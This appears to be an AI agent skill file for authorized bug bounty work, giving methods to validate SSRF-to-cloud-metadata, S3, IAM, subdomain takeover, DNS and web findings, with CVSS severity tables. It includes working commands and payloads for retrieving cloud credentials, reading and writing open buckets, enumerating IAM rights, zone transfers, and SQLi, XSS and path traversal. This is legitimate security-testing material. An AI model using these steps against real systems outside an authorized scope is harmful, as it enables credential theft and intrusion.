---
name: bb-vuln-analysis
description: Vulnerability analysis and exploitation guidance for authorized bug bounty findings. Investigates specific security issues, validates exploitability, and determines severity. Use when asked to "analyze this vulnerability", "investigate this finding", "check if this is exploitable", "test for SSRF", "check this S3 bucket", "validate this bug", "investigate this IAM misconfiguration", or "check this subdomain takeover". Prioritizes cloud vulnerabilities including SSRF to IMDS, IAM misconfigs, storage misconfigs, and subdomain takeovers.
---

# Bug Bounty Vulnerability Analysis

Investigate, validate, and assess the severity of potential security findings on authorized bug bounty targets.

## Prerequisite

State the authorized program name, platform, and confirmed in-scope target asset before beginning analysis.

## Step 1: Classify the Finding

Identify the vulnerability class to select the correct analysis path:

| Class | Priority | Go to |
|---|---|---|
| SSRF → cloud metadata service (IMDS) | Critical — analyse first | Section 2 |
| Cloud storage misconfiguration | Critical — analyse first | Section 3 |
| IAM / permissions misconfiguration | High | Section 4 |
| Subdomain takeover | High | Section 5 |
| DNS misconfiguration | Medium-High | Section 6 |
| Broken authentication / IDOR | High | Section 7 |
| General web vulnerabilities | Medium | Section 8 |

Always work through cloud infrastructure classes (sections 2–6) before general web vulnerabilities.

## Section 2: SSRF → Cloud Metadata Analysis

SSRF that reaches the cloud instance metadata service is typically Critical.

**Identify SSRF candidates:**
Parameters or features that trigger server-side HTTP requests: `?url=`, `?src=`, `?image=`, `?fetch=`, `?link=`, webhooks, import-from-URL features, PDF/screenshot generators, image proxy endpoints.

**Validate SSRF with out-of-band callback first:**
```
# Use Burp Collaborator or interactsh — confirm SSRF before testing IMDS
https://api.example.com/fetch?url=https://YOUR-COLLABORATOR.oastify.com
```

**If SSRF confirmed — test AWS IMDS:**
```
# IMDSv1 — no auth required (critical if reachable)
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
# Returns role name → fetch credentials:
http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE-NAME
# Response contains: AccessKeyId, SecretAccessKey, Token, Expiration
```

**GCP metadata:**
```
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
# Requires Metadata-Flavor: Google header (test if injectable via SSRF)
```

**Azure IMDS:**
```
http://169.254.169.254/metadata/instance?api-version=2021-02-01
# Requires Metadata: true header
```

**Severity:**

| Outcome | Severity |
|---|---|
| SSRF + IMDSv1 + credentials retrieved | Critical |
| SSRF + IMDS reachable + IMDSv2 (no credentials) | High |
| SSRF + internal network access only | High |
| SSRF + reflects internal IPs/ports | Medium |

## Section 3: Cloud Storage Misconfiguration

**Test S3 bucket access (unauthenticated):**
```bash
BUCKET="example-target-bucket"

# Test listing
aws s3 ls s3://$BUCKET --no-sign-request

# Test file read
aws s3 cp s3://$BUCKET/some-file.txt /tmp/out.txt --no-sign-request

# Test write (confirm only — do not write real content)
aws s3api put-object --bucket $BUCKET --key bb-test-$(date +%s).txt \
  --body /dev/null --no-sign-request 2>&1

# Inspect bucket policy and ACL
aws s3api get-bucket-policy --bucket $BUCKET --no-sign-request 2>&1
aws s3api get-bucket-acl --bucket $BUCKET --no-sign-request 2>&1
```

**If listing enabled, search for high-value files:**
```bash
aws s3 ls s3://$BUCKET --recursive --no-sign-request | \
  grep -iE "\.(tfstate|env|json|yaml|sql|dump|bak|key|pem|tar\.gz|zip)$"
```

**Terraform state files (`.tfstate`) — treat as Critical:**
A `.tfstate` file exposes the full infrastructure map and commonly contains plaintext secrets: database passwords, AWS secret keys, private TLS certificates, API tokens. Read the minimum necessary to confirm — one file, a few lines — to demonstrate impact without unnecessary data exfiltration.

**Severity:**

| Finding | Severity |
|---|---|
| Public write access | Critical |
| Public read + `.tfstate` / credentials | Critical |
| Public read + PII or customer data | Critical |
| Public listing + sensitive filenames visible | High |
| Public listing + no sensitive files | Medium |

## Section 4: IAM Misconfiguration Analysis

If credentials are obtained (via SSRF, leaked secrets, or misconfigured assume-role):

```bash
# Identify the principal
aws sts get-caller-identity

# Enumerate all accessible actions
python enumerate-iam.py \
  --access-key $AWS_ACCESS_KEY_ID \
  --secret-key $AWS_SECRET_ACCESS_KEY \
  --session-token $AWS_SESSION_TOKEN

# Check attached policies manually
aws iam list-attached-role-policies --role-name ROLE_NAME
aws iam get-role-policy --role-name ROLE_NAME --policy-name POLICY_NAME
```

High-severity IAM permissions to look for:

| Permission | Risk |
|---|---|
| `iam:CreateAccessKey` or `iam:*` | Privilege escalation to full account |
| `sts:AssumeRole` on `*` | Cross-account or role chaining |
| `s3:*` on `*` | Full S3 access across all buckets |
| `secretsmanager:GetSecretValue` on `*` | Read all secrets |
| `ssm:GetParameter` on `*` | Read all SSM parameters including secrets |
| `ec2:*` | Create instances, modify security groups |
| `lambda:InvokeFunction` on `*` | Execute arbitrary functions |

## Section 5: Subdomain Takeover Validation

**Confirm a dangling CNAME:**
```bash
SUBDOMAIN="legacy.example.com"

# Check the CNAME target
dig CNAME +short $SUBDOMAIN

# For S3 — confirm the bucket is unclaimed
curl -s https://BUCKET-NAME.s3-website-REGION.amazonaws.com
# "NoSuchBucket" or "NoSuchWebsiteConfiguration" → claimable
```

**Proof of concept (claim the resource):**
Create the resource with a harmless `index.html` containing your HackerOne handle. Do not serve malicious content. Take a screenshot showing the subdomain resolves to content you control.

**Severity:** High — enables session cookie theft (same-origin), phishing from a trusted domain, CSP bypass.

## Section 6: DNS Misconfiguration

```bash
TARGET="example.com"

# Zone transfer attempt
dig axfr $TARGET @$(dig NS +short $TARGET | head -1)

# Wildcard DNS (misconfigured catch-all)
dig A "doesnotexist999.$TARGET" +short

# Email security (SPF/DKIM/DMARC)
dig TXT $TARGET | grep -i "v=spf"
dig TXT _dmarc.$TARGET
dig TXT default._domainkey.$TARGET
```

Zone transfer success = High (exposes full DNS infrastructure). Missing or weak DMARC = Medium (enables email spoofing).

## Section 7: Broken Auth and IDOR

**IDOR pattern:**
1. Find an object ID in a response (user ID, order ID, document ID)
2. Log in as a second account
3. Use Account A's session to request Account B's resource ID
4. If data returns → IDOR confirmed

**Auth bypass checks:**
- Access authenticated endpoints without a token
- Use an expired JWT
- Use a valid token from a different account
- Try path traversal: `/api/v1/admin` → `/api/v1/./admin`

**Mass assignment:**
Add extra fields to PUT/PATCH requests: `"role": "admin"`, `"is_verified": true`, `"credits": 9999`.

## Section 8: General Web Vulnerabilities

Apply standard OWASP Top 10 checks after cloud infrastructure findings are exhausted. Prioritize:

| Vulnerability | Quick test |
|---|---|
| SQLi | `'`, `' OR 1=1--`, `' AND SLEEP(5)--` in parameters |
| XSS | `<script>alert(1)</script>`, `"><img src=x onerror=alert(1)>` |
| XXE | Submit XML with external entity reference |
| Open redirect | `?next=https://evil.com` |
| Path traversal | `../../etc/passwd` in file parameters |

## Step 2: Severity Assessment (CVSS 3.1)

After validating the finding, calculate a CVSS 3.1 score. Use these baselines as a starting point:

| Finding | Baseline CVSS | Label |
|---|---|---|
| SSRF → IMDSv1 credentials | 9.8 | Critical |
| Public S3 + write access | 9.1 | Critical |
| Public S3 + `.tfstate` file | 9.1 | Critical |
| IAM `iam:CreateAccessKey` | 9.8 | Critical |
| Exposed Kubernetes dashboard | 9.8 | Critical |
| Subdomain takeover | 8.1 | High |
| Public S3 + listing | 7.5 | High |
| Exposed Elasticsearch | 8.6 | High |
| SSRF (internal only, no IMDS) | 7.2 | High |
| Zone transfer | 7.5 | High |

Once the finding is validated and severity assigned, invoke `bb-report-writer` to draft the submission.

Read `references/cloud-vulns-reference.md` for detailed exploitation chains, bypass techniques, and escalation paths for each cloud vulnerability class.
